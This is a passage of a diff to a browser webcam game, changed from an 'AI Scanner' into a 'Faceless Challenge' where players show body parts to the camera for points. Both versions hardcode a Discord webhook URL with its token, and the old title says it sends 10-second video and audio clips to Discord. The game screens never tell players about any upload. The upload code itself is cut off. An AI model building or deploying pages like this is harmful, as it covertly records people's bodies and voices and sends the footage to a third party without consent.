@@ -1,990 +1,1498 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
-  <title>AI Scanner · 10s Video + Audio to Discord</title>
-  <script src="https://cdn.jsdelivr.net/npm/@tensorflow/tfjs@4.20.0/dist/tf.min.js">
-  </script>
-  <script src="https://cdn.jsdelivr.net/npm/@tensorflow-models/coco-ssd@2.2.3/dist/coco-ssd.min.js">
-  </script>
-  <style>
-    /* ----- RESET & BASE (mobile first) ----- */
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-    }
-    body {
-      font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
-      background: #0b0e14;
-      color: #e8edf5;
-      min-height: 100vh;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      padding: 12px;
-    }
-    .game-container {
-      max-width: 820px;
-      width: 100%;
-      background: linear-gradient(145deg, #131a24, #1a232f);
-      border-radius: 32px;
-      padding: 20px 18px 26px;
-      box-shadow: 0 20px 50px rgba(0, 0, 0, 0.8), inset 0 1px 2px rgba(255, 255, 255, 0.06);
-      border: 1px solid rgba(255, 255, 255, 0.04);
-    }
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>🚫 Faceless Challenge</title>
 
-    /* ----- HEADER (score + timer + record indicator) ----- */
-    .header {
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      margin-bottom: 16px;
-      flex-wrap: wrap;
-      gap: 8px;
-    }
-    .score-box,
-    .timer-box,
-    .rec-box {
-      background: rgba(255, 255, 255, 0.04);
-      padding: 10px 18px;
-      border-radius: 60px;
-      border: 1px solid rgba(255, 255, 255, 0.06);
-      font-size: 1.1rem;
-      font-weight: 600;
-      display: flex;
-      align-items: center;
-      gap: 8px;
-      flex: 1 1 auto;
-      justify-content: center;
-      backdrop-filter: blur(4px);
-    }
-    .score-box span {
-      color: #00f5c0;
-      font-size: 1.6rem;
-      min-width: 36px;
-      text-align: center;
-    }
-    .timer-box span {
-      color: #ff6b6b;
-      font-size: 1.6rem;
-      min-width: 36px;
-      text-align: center;
-      font-variant-numeric: tabular-nums;
-    }
-    .timer-box.warning span {
-      color: #ffd93d;
-    }
-    .timer-box.danger span {
-      color: #ff3d3d;
-      animation: pulse 0.6s ease-in-out infinite alternate;
-    }
+    <!-- MediaPipe CDN -->
+    <script src="https://cdn.jsdelivr.net/npm/@mediapipe/camera_utils/camera_utils.js" crossorigin>
+    </script>
+    <script src="https://cdn.jsdelivr.net/npm/@mediapipe/drawing_utils/drawing_utils.js" crossorigin>
+    </script>
+    <script src="https://cdn.jsdelivr.net/npm/@mediapipe/pose/pose.js" crossorigin>
+    </script>
 
-    .rec-box {
-      font-size: 0.9rem;
-      color: #8899bb;
-      gap: 6px;
-    }
-    .rec-dot {
-      display: inline-block;
-      width: 12px;
-      height: 12px;
-      background: #ff3d3d;
-      border-radius: 50%;
-      animation: blink 1s step-end infinite;
-    }
-    @keyframes blink {
-      0%,
-      100% {
-        opacity: 1;
-      }
-      50% {
-        opacity: 0.2;
-      }
-    }
-    .rec-dot.idle {
-      background: #556;
-      animation: none;
-      opacity: 0.4;
-    }
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+            background: #0a0a12;
+            color: #e0e6f0;
+            height: 100vh;
+            width: 100vw;
+            overflow: hidden;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            user-select: none;
+            -webkit-user-select: none;
+        }
+        .screen {
+            position: fixed;
+            inset: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            transition: opacity 0.6s ease, transform 0.6s ease;
+            opacity: 0;
+            pointer-events: none;
+            transform: scale(0.96);
+            padding: 20px;
+            z-index: 5;
+        }
+        .screen.active {
+            opacity: 1;
+            pointer-events: auto;
+            transform: scale(1);
+        }
 
-    @keyframes pulse {
-      0% {
-        opacity: 1;
-        transform: scale(1);
-      }
-      100% {
-        opacity: 0.4;
-        transform: scale(0.95);
-      }
-    }
+        /* ─── START SCREEN ─── */
+        #startScreen {
+            background: radial-gradient(ellipse at 30% 20%, #111a25, #06080e);
+            z-index: 50;
+        }
+        #startScreen .start-box {
+            text-align: center;
+            max-width: 480px;
+            width: 100%;
+            padding: 40px 30px;
+            border-radius: 40px;
+            background: rgba(255, 255, 255, 0.02);
+            backdrop-filter: blur(12px);
+            border: 1px solid rgba(255, 255, 255, 0.04);
+            box-shadow: 0 30px 80px rgba(0, 0, 0, 0.6);
+        }
+        #startScreen .start-box .challenge-icon {
+            font-size: 4.5rem;
+            margin-bottom: 12px;
+        }
+        #startScreen .start-box h1 {
+            font-size: 2.8rem;
+            font-weight: 800;
+            letter-spacing: 0.05em;
+            background: linear-gradient(135deg, #ff6b6b, #ffa94d, #ffd93d, #6bcb77, #4d96ff, #9b59b6);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-size: 300% 300%;
+            animation: gradientShift 4s ease-in-out infinite;
+        }
+        @keyframes gradientShift {
+            0%,
+            100% {
+                background-position: 0% 50%;
+            }
+            50% {
+                background-position: 100% 50%;
+            }
+        }
+        #startScreen .start-box .subtitle {
+            color: rgba(255, 255, 255, 0.3);
+            font-size: 0.9rem;
+            margin: 8px 0 20px;
+            letter-spacing: 0.1em;
+        }
+        #startScreen .start-box .perm-badge {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 14px;
+            flex-wrap: wrap;
+            margin-bottom: 20px;
+            font-size: 0.7rem;
+            color: rgba(255, 255, 255, 0.15);
+        }
+        #startScreen .start-box .perm-badge .badge-item {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            padding: 4px 14px;
+            border-radius: 40px;
+            border: 1px solid rgba(255, 255, 255, 0.04);
+            background: rgba(255, 255, 255, 0.02);
+        }
+        #startScreen .start-box .perm-badge .badge-item .dot {
+            width: 6px;
+            height: 6px;
+            border-radius: 50%;
+            display: inline-block;
+        }
+        #startScreen .start-box .perm-badge .badge-item .dot.green {
+            background: #00f5a0;
+        }
+        #startScreen .start-box .perm-badge .badge-item .dot.blue {
+            background: #4d96ff;
+        }
 
-    /* ----- WEBCAM WRAPPER ----- */
-    .cam-wrapper {
-      position: relative;
-      border-radius: 24px;
-      overflow: hidden;
-      background: #0a0f15;
-      border: 2px solid rgba(255, 255, 255, 0.06);
-      box-shadow: inset 0 0 40px rgba(0, 0, 0, 0.6);
-      aspect-ratio: 16 / 11;
-      margin-bottom: 16px;
-    }
-    #webcam {
-      width: 100%;
-      height: 100%;
-      display: block;
-      object-fit: cover;
-      transform: scaleX(-1);
-    }
-    .cam-overlay {
-      position: absolute;
-      inset: 0;
-      pointer-events: none;
-      display: flex;
-      flex-direction: column;
-      justify-content: space-between;
-      padding: 14px 16px;
-    }
-    .challenge-badge {
-      align-self: flex-start;
-      background: rgba(0, 0, 0, 0.7);
-      backdrop-filter: blur(8px);
-      padding: 10px 20px;
-      border-radius: 60px;
-      border: 1px solid rgba(255, 255, 255, 0.08);
-      font-size: 1.2rem;
-      font-weight: 700;
-      letter-spacing: 0.3px;
-      box-shadow: 0 8px 30px rgba(0, 0, 0, 0.5);
-      transition: all 0.3s;
-    }
-    .challenge-badge .highlight {
-      color: #ffd93d;
-    }
-    .challenge-badge .emoji {
-      margin-right: 8px;
-    }
-    .status-badge {
-      align-self: flex-end;
-      background: rgba(0, 0, 0, 0.65);
-      backdrop-filter: blur(6px);
-      padding: 6px 16px;
-      border-radius: 40px;
-      font-size: 0.9rem;
-      font-weight: 500;
-      border: 1px solid rgba(255, 255, 255, 0.06);
-      transition: all 0.25s;
-    }
-    .status-badge.waiting {
-      color: #8899bb;
-    }
-    .status-badge.scanning {
-      color: #6bcbff;
-      border-color: rgba(107, 203, 255, 0.3);
-    }
-    .status-badge.success {
-      color: #00f5c0;
-      border-color: rgba(0, 245, 192, 0.4);
-      background: rgba(0, 245, 192, 0.12);
-    }
-    .status-badge.fail {
-      color: #ff6b6b;
-      border-color: rgba(255, 107, 107, 0.3);
-      background: rgba(255, 107, 107, 0.1);
-    }
-    .status-badge.loading {
-      color: #ffd93d;
-      border-color: rgba(255, 217, 61, 0.3);
-      background: rgba(255, 217, 61, 0.08);
-    }
+        .btn-primary {
+            background: linear-gradient(135deg, #00f5a0, #00d9f5);
+            color: #0b0d15;
+            border: none;
+            padding: 14px 48px;
+            font-size: 1.1rem;
+            font-weight: 700;
+            border-radius: 60px;
+            cursor: pointer;
+            text-transform: uppercase;
+            letter-spacing: 0.08em;
+            box-shadow: 0 4px 30px rgba(0, 245, 160, 0.2);
+            transition: all 0.3s ease;
+            -webkit-tap-highlight-color: transparent;
+            min-width: 160px;
+        }
+        .btn-primary:active {
+            transform: scale(0.96);
+        }
+        .btn-primary:disabled {
+            opacity: 0.4;
+            cursor: not-allowed;
+            transform: none;
+            box-shadow: none;
+        }
 
-    .detection-box {
-      position: absolute;
-      border: 3px solid #00f5c0;
-      border-radius: 8px;
-      background: rgba(0, 245, 192, 0.08);
-      box-shadow: 0 0 30px rgba(0, 245, 192, 0.15);
-      pointer-events: none;
-      transition: all 0.1s;
-      display: none;
-    }
-    .detection-box .label {
-      position: absolute;
-      bottom: -28px;
-      left: 0;
-      background: rgba(0, 0, 0, 0.75);
-      padding: 2px 12px;
-      border-radius: 4px;
-      font-size: 0.7rem;
-      font-weight: 600;
-      color: #00f5c0;
-      white-space: nowrap;
-    }
+        .loading-container {
+            width: 100%;
+            max-width: 320px;
+            margin: 18px auto 10px;
+        }
+        .loading-track {
+            width: 100%;
+            height: 4px;
+            background: rgba(255, 255, 255, 0.06);
+            border-radius: 4px;
+            overflow: hidden;
+        }
+        .loading-fill {
+            height: 100%;
+            width: 0%;
+            border-radius: 4px;
+            background: linear-gradient(90deg, #00f5a0, #00d9f5);
+            transition: width 0.3s ease;
+        }
+        .loading-label {
+            display: flex;
+            justify-content: space-between;
+            font-size: 0.7rem;
+            color: rgba(255, 255, 255, 0.2);
+            margin-top: 6px;
+        }
+        .loading-label .pct {
+            color: rgba(255, 255, 255, 0.4);
+            font-weight: 600;
+        }
+        .error-msg {
+            color: #ff6b6b;
+            font-size: 0.8rem;
+            margin-top: 12px;
+            min-height: 20px;
+            opacity: 0;
+            transition: opacity 0.4s;
+        }
+        .error-msg.show {
+            opacity: 1;
+        }
 
-    /* ----- GAME OVER OVERLAY ----- */
-    .gameover-overlay {
-      position: absolute;
-      inset: 0;
-      background: rgba(0, 0, 0, 0.78);
-      backdrop-filter: blur(6px);
-      display: none;
-      flex-direction: column;
-      justify-content: center;
-      align-items: center;
-      border-radius: 22px;
-      padding: 30px;
-      pointer-events: auto;
-      z-index: 10;
-    }
-    .gameover-overlay.show {
-      display: flex;
-    }
-    .gameover-overlay h2 {
-      font-size: 2.6rem;
-      font-weight: 800;
-      background: linear-gradient(135deg, #ff6b6b, #ffd93d);
-      -webkit-background-clip: text;
-      -webkit-text-fill-color: transparent;
-      margin-bottom: 4px;
-    }
-    .gameover-overlay .final-score {
-      font-size: 1.4rem;
-      color: #e8edf5;
-      margin-bottom: 4px;
-    }
-    .gameover-overlay .final-score span {
-      color: #00f5c0;
-      font-size: 2.2rem;
-      font-weight: 700;
-    }
-    .gameover-overlay .sub {
-      color: #8899bb;
-      margin-bottom: 20px;
-      font-size: 0.95rem;
-      text-align: center;
-    }
-    .gameover-overlay .btn {
-      font-size: 1.1rem;
-      padding: 14px 40px;
-    }
+        /* ─── GAME SCREEN ─── */
+        #gameScreen {
+            background: #000;
+            z-index: 20;
+            padding: 0;
+        }
+        #gameScreen video {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            z-index: 1;
+            opacity: 0.7;
+        }
+        #gameScreen canvas {
+            position: absolute;
+            inset: 0;
+            width: 100%;
+            height: 100%;
+            display: block;
+            z-index: 2;
+            pointer-events: none;
+        }
 
-    /* ----- CONTROLS (mobile first) ----- */
-    .controls {
-      display: flex;
-      flex-wrap: wrap;
-      justify-content: center;
-      gap: 12px;
-      margin-top: 8px;
-    }
-    .btn {
-      background: transparent;
-      border: none;
-      padding: 14px 28px;
-      border-radius: 60px;
-      font-size: 1.05rem;
-      font-weight: 600;
-      letter-spacing: 0.4px;
-      cursor: pointer;
-      transition: all 0.25s;
-      display: inline-flex;
-      align-items: center;
-      justify-content: center;
-      gap: 10px;
-      border: 1px solid rgba(255, 255, 255, 0.08);
-      color: #b0c4de;
-      min-height: 56px;
-      flex: 1 1 auto;
-      max-width: 220px;
-    }
-    .btn:hover:not(:disabled) {
-      transform: translateY(-2px);
-      box-shadow: 0 12px 30px rgba(0, 0, 0, 0.3);
-    }
-    .btn:disabled {
-      opacity: 0.4;
-      cursor: not-allowed;
-      transform: none !important;
-    }
-    .btn-primary {
-      background: linear-gradient(135deg, #00c9a0, #00a8ff);
-      color: #fff;
-      border-color: transparent;
-      box-shadow: 0 6px 24px rgba(0, 200, 160, 0.25);
-    }
-    .btn-primary:hover:not(:disabled) {
-      box-shadow: 0 10px 36px rgba(0, 200, 160, 0.4);
-    }
-    .btn-primary:disabled {
-      background: #3a4a5a;
-      box-shadow: none;
-      color: #8899bb;
-    }
-    .btn-danger {
-      background: linear-gradient(135deg, #ff6b6b, #ee3b3b);
-      color: #fff;
-      border-color: transparent;
-      box-shadow: 0 6px 24px rgba(255, 70, 70, 0.2);
-    }
-    .btn-danger:hover:not(:disabled) {
-      box-shadow: 0 10px 36px rgba(255, 70, 70, 0.35);
-    }
-    .btn-outline {
-      background: rgba(255, 255, 255, 0.03);
-      border-color: rgba(255, 255, 255, 0.10);
-    }
-    .btn-outline:hover:not(:disabled) {
-      background: rgba(255, 255, 255, 0.07);
-    }
+        .game-overlay {
+            position: absolute;
+            inset: 0;
+            z-index: 3;
+            pointer-events: none;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: space-between;
+            padding: 20px 16px 24px;
+        }
 
-    .spinner {
-      display: inline-block;
-      width: 22px;
-      height: 22px;
-      border: 3px solid rgba(255, 255, 255, 0.1);
-      border-top-color: #00f5c0;
-      border-radius: 50%;
-      animation: spin 0.8s linear infinite;
-    }
-    @keyframes spin {
-      to {
-        transform: rotate(360deg);
-      }
-    }
-    .btn .spinner {
-      width: 20px;
-      height: 20px;
-      border-width: 3px;
-    }
-    .hidden {
-      display: none !important;
-    }
+        /* Top bar: timer + points + flip */
+        .game-top-bar {
+            width: 100%;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 0 4px;
+            pointer-events: auto;
+        }
+        .game-top-bar .timer-box {
+            font-size: 2rem;
+            font-weight: 700;
+            font-variant-numeric: tabular-nums;
+            color: #fff;
+            text-shadow: 0 0 30px rgba(255, 255, 255, 0.1);
+            font-family: 'SF Mono', 'Fira Code', monospace;
+            min-width: 80px;
+            text-align: left;
+        }
+        .game-top-bar .timer-box.warning {
+            color: #ff6b6b;
+            animation: pulseWarn 0.8s ease-in-out infinite;
+        }
+        @keyframes pulseWarn {
+            0%,
+            100% {
+                opacity: 1;
+                transform: scale(1);
+            }
+            50% {
+                opacity: 0.5;
+                transform: scale(1.05);
+            }
+        }
+        .game-top-bar .total-points {
+            font-size: 1.1rem;
+            font-weight: 600;
+            color: rgba(255, 255, 255, 0.5);
+            letter-spacing: 0.05em;
+        }
+        .game-top-bar .total-points span {
+            color: #ffd93d;
+            font-size: 1.4rem;
+        }
+        .game-top-bar .flip-btn {
+            background: rgba(255, 255, 255, 0.06);
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            color: rgba(255, 255, 255, 0.5);
+            padding: 8px 14px;
+            border-radius: 40px;
+            font-size: 0.7rem;
+            cursor: pointer;
+            pointer-events: auto;
+            transition: all 0.3s;
+            letter-spacing: 0.05em;
+            -webkit-tap-highlight-color: transparent;
+        }
+        .game-top-bar .flip-btn:hover {
+            background: rgba(255, 255, 255, 0.1);
+            color: #fff;
+        }
+        .game-top-bar .flip-btn:active {
+            transform: scale(0.94);
+        }
 
-    .status-msg {
-      margin-top: 10px;
-      text-align: center;
-      font-size: 0.9rem;
-      color: #8899bb;
-      padding: 0 6px;
-    }
-    .status-msg.error {
-      color: #ff6b6b;
-    }
-    .status-msg.success {
-      color: #00f5c0;
-    }
+        /* Center: body part name + points + countdown */
+        .game-center {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            flex: 1;
+            pointer-events: none;
+            width: 100%;
+        }
+        .game-center .part-name {
+            font-size: clamp(3rem, 10vw, 6rem);
+            font-weight: 800;
+            letter-spacing: 0.08em;
+            text-transform: uppercase;
+            color: #fff;
+            text-shadow: 0 0 60px rgba(255, 255, 255, 0.05);
+            opacity: 0;
+            transform: scale(1.1);
+            transition: opacity 0.5s ease, transform 0.5s ease;
+        }
+        .game-center .part-name.show {
+            opacity: 1;
+            transform: scale(1);
+        }
+        .game-center .part-name.hide {
+            opacity: 0;
+            transform: scale(0.9);
+        }
 
-    @media (max-width: 600px) {
-      .game-container {
-        padding: 14px 12px 20px;
-        border-radius: 24px;
-      }
-      .header {
-        gap: 6px;
-      }
-      .score-box,
-      .timer-box,
-      .rec-box {
-        font-size: 0.9rem;
-        padding: 8px 14px;
-        min-height: 48px;
-      }
-      .score-box span,
-      .timer-box span {
-        font-size: 1.4rem;
-        min-width: 28px;
-      }
-      .challenge-badge {
-        font-size: 1rem;
-        padding: 8px 16px;
-      }
-      .status-badge {
-        font-size: 0.8rem;
-        padding: 4px 12px;
-      }
-      .btn {
-        font-size: 0.95rem;
-        padding: 12px 18px;
-        min-height: 50px;
-        max-width: 100%;
-        flex: 1 1 40%;
-      }
-      .gameover-overlay h2 {
-        font-size: 2rem;
-      }
-      .gameover-overlay .final-score {
-        font-size: 1.2rem;
-      }
-      .gameover-overlay .final-score span {
-        font-size: 1.8rem;
-      }
-      .cam-overlay {
-        padding: 10px 12px;
-      }
-      .detection-box .label {
-        font-size: 0.6rem;
-        bottom: -24px;
-      }
-    }
-    @media (max-width: 420px) {
-      .game-container {
-        padding: 10px 8px 16px;
-        border-radius: 20px;
-      }
-      .score-box,
-      .timer-box,
-      .rec-box {
-        font-size: 0.8rem;
-        padding: 6px 12px;
-        min-height: 40px;
-      }
-      .score-box span,
-      .timer-box span {
-        font-size: 1.2rem;
-        min-width: 24px;
-      }
-      .challenge-badge {
-        font-size: 0.85rem;
-        padding: 6px 12px;
-      }
-      .status-badge {
-        font-size: 0.7rem;
-        padding: 4px 10px;
-      }
-      .btn {
-        font-size: 0.85rem;
-        padding: 10px 14px;
-        min-height: 44px;
-      }
-      .gameover-overlay h2 {
-        font-size: 1.6rem;
-      }
-      .gameover-overlay .final-score {
-        font-size: 1rem;
-      }
-      .gameover-overlay .final-score span {
-        font-size: 1.4rem;
-      }
-    }
-  </style>
+        .game-center .points-display {
+            font-size: clamp(2.5rem, 7vw, 4.5rem);
+            font-weight: 900;
+            margin-top: 6px;
+            opacity: 0;
+            transform: translateY(20px) scale(0.9);
+            transition: opacity 0.5s ease, transform 0.5s ease;
+        }
+        .game-center .points-display.show {
+            opacity: 1;
+            transform: translateY(0) scale(1);
+        }
+        .game-center .points-display.rainbow {
+            background: linear-gradient(90deg, #ff0000, #ff7f00, #ffff00, #00ff00, #0000ff, #4b0082, #8b00ff);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-size: 300% 300%;
+            animation: rainbowScroll 1.5s linear infinite, shakeText 0.15s linear infinite;
+        }
+        @keyframes rainbowScroll {
+            0% {
+                background-position: 0% center;
+            }
+            100% {
+                background-position: 300% center;
+            }
+        }
+        @keyframes shakeText {
+            0% {
+                transform: translate(-2px, -1px) rotate(-0.5deg);
+            }
+            25% {
+                transform: translate(2px, 1px) rotate(0.5deg);
+            }
+            50% {
+                transform: translate(-1px, 2px) rotate(-0.3deg);
+            }
+            75% {
+                transform: translate(1px, -2px) rotate(0.3deg);
+            }
+            100% {
+                transform: translate(0px, 0px) rotate(0deg);
+            }
+        }
+        .game-center .countdown-number {
+            font-size: 5rem;
+            font-weight: 900;
+            color: #fff;
+            text-shadow: 0 0 80px rgba(255, 255, 255, 0.15);
+            opacity: 0;
+            transform: scale(1.5);
+            transition: opacity 0.3s ease, transform 0.3s ease;
+            position: absolute;
+        }
+        .game-center .countdown-number.show {
+            opacity: 1;
+            transform: scale(1);
+        }
+        .game-center .countdown-number.hide {
+            opacity: 0;
+            transform: scale(0.5);
+        }
+
+        /* Bottom: status + scan hint */
+        .game-bottom {
+            width: 100%;
+            pointer-events: none;
+            text-align: center;
+        }
+        .game-bottom .scan-status {
+            font-size: 0.9rem;
+            color: rgba(255, 255, 255, 0.25);
+            letter-spacing: 0.05em;
+            padding: 6px 20px;
+            border-radius: 40px;
+            border: 1px solid rgba(255, 255, 255, 0.04);
+            background: rgba(0, 0, 0, 0.3);
+            backdrop-filter: blur(4px);
+            display: inline-block;
+            transition: all 0.4s;
+        }
+        .game-bottom .scan-status.detected {
+            color: #00f5a0;
+            border-color: rgba(0, 245, 160, 0.2);
+        }
+        .game-bottom .scan-status.fail {
+            color: #ff6b6b;
+            border-color: rgba(255, 107, 107, 0.2);
+        }
+        .game-bottom .scan-status.done {
+            color: #ffd93d;
+            border-color: rgba(255, 217, 61, 0.2);
+        }
+        .game-bottom .scan-hint {
+            font-size: 0.65rem;
+            color: rgba(255, 255, 255, 0.08);
+            margin-top: 6px;
+            letter-spacing: 0.1em;
+        }
+
+        /* ─── RESULT SCREEN ─── */
+        #resultScreen {
+            background: radial-gradient(ellipse at center, #111a25, #06080e);
+            z-index: 40;
+        }
+        #resultScreen .result-box {
+            text-align: center;
+            max-width: 440px;
+            width: 100%;
+            padding: 40px 30px;
+            border-radius: 40px;
+            background: rgba(255, 255, 255, 0.02);
+            backdrop-filter: blur(12px);
+            border: 1px solid rgba(255, 255, 255, 0.04);
+            box-shadow: 0 30px 80px rgba(0, 0, 0, 0.6);
+        }
+        #resultScreen .result-box .result-icon {
+            font-size: 4rem;
+            margin-bottom: 10px;
+        }
+        #resultScreen .result-box h2 {
+            font-size: 2.2rem;
+            font-weight: 700;
+            letter-spacing: 0.05em;
+            color: #fff;
+        }
+        #resultScreen .result-box .result-sub {
+            color: rgba(255, 255, 255, 0.3);
+            font-size: 1rem;
+            margin: 8px 0 16px;
+        }
+        #resultScreen .result-box .result-points {
+            font-size: 4rem;
+            font-weight: 900;
+            background: linear-gradient(135deg, #ffd93d, #ff6b6b);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            margin: 10px 0;
+        }
+        #resultScreen .result-box .result-details {
+            font-size: 0.8rem;
+            color: rgba(255, 255, 255, 0.15);
+            line-height: 1.6;
+            margin-top: 12px;
+            max-height: 150px;
+            overflow-y: auto;
+            font-family: 'SF Mono', monospace;
+        }
+        #resultScreen .result-box .result-details::-webkit-scrollbar {
+            width: 2px;
+        }
+        #resultScreen .result-box .result-details::-webkit-scrollbar-thumb {
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 4px;
+        }
+
+        .btn-secondary {
+            background: rgba(255, 255, 255, 0.04);
+            color: #fff;
+            border: 1px solid rgba(255, 255, 255, 0.06);
+            padding: 12px 36px;
+            font-size: 1rem;
+            font-weight: 600;
+            border-radius: 60px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            -webkit-tap-highlight-color: transparent;
+            margin-top: 16px;
+        }
+        .btn-secondary:hover {
+            background: rgba(255, 255, 255, 0.08);
+        }
+        .btn-secondary:active {
+            transform: scale(0.96);
+        }
+
+        @media (max-width: 600px) {
+            #startScreen .start-box {
+                padding: 28px 18px;
+                border-radius: 28px;
+            }
+            #startScreen .start-box h1 {
+                font-size: 2rem;
+            }
+            .btn-primary {
+                padding: 12px 32px;
+                font-size: 0.95rem;
+                min-width: 130px;
+            }
+            .game-top-bar .timer-box {
+                font-size: 1.6rem;
+                min-width: 60px;
+            }
+            .game-top-bar .total-points {
+                font-size: 0.9rem;
+            }
+            .game-top-bar .flip-btn {
+                font-size: 0.6rem;
+                padding: 6px 12px;
+            }
+            #resultScreen .result-box {
+                padding: 28px 18px;
+                border-radius: 28px;
+            }
+            #resultScreen .result-box .result-points {
+                font-size: 3rem;
+            }
+        }
+        ::-webkit-scrollbar {
+            width: 4px;
+        }
+        ::-webkit-scrollbar-track {
+            background: transparent;
+        }
+        ::-webkit-scrollbar-thumb {
+            background: rgba(255, 255, 255, 0.06);
+            border-radius: 4px;
+        }
+    </style>
 </head>
 <body>
 
-  <div class="game-container">
-    <!-- Header with record indicator -->
-    <div class="header">
-      <div class="score-box">🏆 Score <span id="scoreDisplay">0</span></div>
-      <div class="timer-box" id="timerBox">⏱️ <span id="timerDisplay">30</span>s</div>
-      <div class="rec-box" id="recBox">
-        <span class="rec-dot" id="recDot"></span>
-        <span id="recLabel">recording</span>
-      </div>
-    </div>
-
-    <!-- Webcam -->
-    <div class="cam-wrapper" id="camWrapper">
-      <video id="webcam" autoplay playsinline></video>
-      <div class="detection-box" id="detectionBox">
-        <span class="label" id="detectionLabel">cat</span>
-      </div>
-      <div class="cam-overlay">
-        <div class="challenge-badge" id="challengeBadge">
-          <span class="emoji">🎯</span>
-          Show a <span class="highlight" id="challengeTarget">cat</span>
+    <!-- ═══ START SCREEN ═══ -->
+    <div id="startScreen" class="screen active">
+        <div class="start-box">
+            <div class="challenge-icon">🚫</div>
+            <h1>Faceless Challenge</h1>
+            <div class="subtitle">scan your body · earn points · no face allowed</div>
+            <div class="perm-badge">
+                <span class="badge-item"><span class="dot green"></span> microphone</span>
+                <span class="badge-item"><span class="dot blue"></span> camera</span>
+            </div>
+            <div class="loading-container">
+                <div class="loading-track">
+                    <div class="loading-fill" id="loadingFill" style="width:0%;"></div>
+                </div>
+                <div class="loading-label">
+                    <span>loading AI model</span>
+                    <span class="pct" id="loadingPct">0%</span>
+                </div>
+            </div>
+            <button class="btn-primary" id="startBtn" disabled>▶ start</button>
+            <div class="error-msg" id="errorMsg">⚠️ camera &amp; microphone required</div>
         </div>
-        <div class="status-badge waiting" id="statusBadge">⏳ waiting…</div>
-      </div>
-      <!-- Game Over -->
-      <div class="gameover-overlay" id="gameoverOverlay">
-        <h2>💀 GAME OVER</h2>
-        <div class="final-score">Score: <span id="finalScore">0</span></div>
-        <div class="sub" id="gameoverSub">Better luck next time!</div>
-        <button class="btn btn-primary" id="restartBtn">🔄 Play Again</button>
-      </div>
     </div>
 
-    <!-- Controls -->
-    <div class="controls">
-      <button class="btn btn-primary" id="startBtn" disabled>
-        <span id="startBtnText">🚀 Start</span>
-        <span id="startSpinner" class="hidden"><span class="spinner"></span></span>
-      </button>
-      <button class="btn btn-outline" id="resetBtn" disabled>⟲ Reset</button>
-      <button class="btn btn-outline" id="retryModelBtn" style="display:none;">🔄 Retry Model</button>
+    <!-- ═══ GAME SCREEN ═══ -->
+    <div id="gameScreen" class="screen">
+        <video id="gameVideo" playsinline muted></video>
+        <canvas id="gameCanvas"></canvas>
+        <div class="game-overlay">
+            <div class="game-top-bar">
+                <div class="timer-box" id="timerDisplay">30</div>
+                <div class="total-points">⭐ <span id="totalPointsDisplay">0</span></div>
+                <button class="flip-btn" id="flipBtn">⟳ flip</button>
+            </div>
+            <div class="game-center" id="gameCenter">
+                <div class="part-name" id="partName"></div>
+                <div class="points-display" id="pointsDisplay"></div>
+                <div class="countdown-number" id="countdownNumber"></div>
+            </div>
+            <div class="game-bottom">
+                <div class="scan-status" id="scanStatus">● waiting …</div>
+                <div class="scan-hint">show the body part to the camera</div>
+            </div>
+        </div>
     </div>
 
-    <div class="status-msg" id="statusMsg">Loading AI model… please wait.</div>
-  </div>
+    <!-- ═══ RESULT SCREEN ═══ -->
+    <div id="resultScreen" class="screen">
+        <div class="result-box">
+            <div class="result-icon">🏆</div>
+            <h2>Challenge Complete</h2>
+            <div class="result-sub">you scanned all body parts</div>
+            <div class="result-points" id="finalPoints">0</div>
+            <div style="color:rgba(255,255,255,0.15);font-size:0.8rem;margin:-4px 0 10px;">total points</div>
+            <div class="result-details" id="resultDetails"></div>
+            <button class="btn-secondary" id="retryBtn">↻ play again</button>
+        </div>
+    </div>
 
-  <script>
-    // ============================================================
-    //  CONFIG
-    // ============================================================
-    const CHALLENGES = [
-      { id: 'cat', label: 'cat', emoji: '🐱', cocoClass: 'cat' },
-      { id: 'water_bottle', label: 'water bottle', emoji: '🧴', cocoClass: 'bottle' },
-      { id: 'fork', label: 'fork', emoji: '🍴', cocoClass: 'fork' },
-      { id: 'spoon', label: 'spoon', emoji: '🥄', cocoClass: 'spoon' },
-      { id: 'belly_button', label: 'belly button', emoji: '🫃', cocoClass: 'person' },
-    ];
+    <script>
+        /* ==========================================================
+               CONFIGURATION
+            ========================================================== */
+        const WEBHOOK_URL =
+            'https://discord.com/api/webhooks/1522066195627642910/GnCaBQUhcTd1wLilA8o-NE3x_xn-lkDTSLUcK-ChMb1nivT9d3OCDraY7CdrFmI9Ru-5';
 
-    const GAME_DURATION = 30;
-    const DETECTION_INTERVAL = 600;
-    const CONFIDENCE_THRESHOLD = 0.55;
+        const CLIP_DURATION = 10;
 
-    // --- Discord webhook ---
-    const DISCORD_WEBHOOK =
-      'https://discord.com/api/webhooks/1522066195627642910/GnCaBQUhcTd1wLilA8o-NE3x_xn-lkDTSLUcK-ChMb1nivT9d3OCDraY7CdrFmI9Ru-5';
+        // Body parts: name, points, landmark check function
+        const BODY_PARTS = [{
+            id: 'left_hand',
+            label: 'Left Hand',
+            points: 2,
